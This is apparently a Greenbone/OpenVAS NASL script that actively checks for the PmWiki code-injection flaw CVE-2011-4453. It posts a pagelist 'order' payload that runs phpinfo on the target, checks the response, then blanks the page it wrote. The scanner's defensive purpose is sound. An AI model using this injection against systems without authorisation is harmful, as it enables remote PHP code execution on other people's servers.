CPE = "cpe:/a:pmwiki:pmwiki";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902592" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-11-28 13:13:13 +0530 (Mon, 28 Nov 2011)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2011-4453" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "PmWiki < 2.2.35 PHP Code Injection Vulnerability - Active Check" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_pmwiki_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "pmwiki/http/detected" );
	script_tag( name: "summary", value: "PmWiki is prone to a PHP code injection vulnerability." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP POST request and checks the response." );
	script_tag( name: "insight", value: "The flaw is due to improper validation of user-supplied input
  via the 'order' argument of a pagelist directive within a PmWiki page, which allows attackers to
  execute arbitrary PHP code." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to inject
  and execute arbitrary PHP code in the context of the affected application." );
	script_tag( name: "affected", value: "PmWiki versions 2.0.0 through 2.2.34." );
	script_tag( name: "solution", value: "Update to version 2.2.35 or later." );
	script_xref( name: "URL", value: "http://secunia.com/advisories/46968" );
	script_xref( name: "URL", value: "http://www.pmwiki.org/wiki/PITS/01271" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/18149" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/520631" );
	script_xref( name: "URL", value: "http://www.pmwiki.org/wiki/PmWiki/ChangeLog#v2235" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/pmwiki.php";
postData = "action=edit&post=save&n=Cmd.Shell&text=(:pagelist order=']);phpinfo();die;#:)";
host = http_host_name( port: port );
req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n", "\\r\\n", postData );
res = http_keepalive_send_recv( port: port, data: req );
if(IsMatchRegexp( res, "^HTTP/1\\.[01] 30" )){
	path = url + "?n=Cmd.Shell";
	if(http_vuln_check( port: port, url: path, pattern: ">phpinfo\\(\\)<" )){
		postData = "action=edit&post=save&n=Cmd.Shell&text=";
		req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n", "\\r\\n", postData );
		res = http_keepalive_send_recv( port: port, data: req );
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

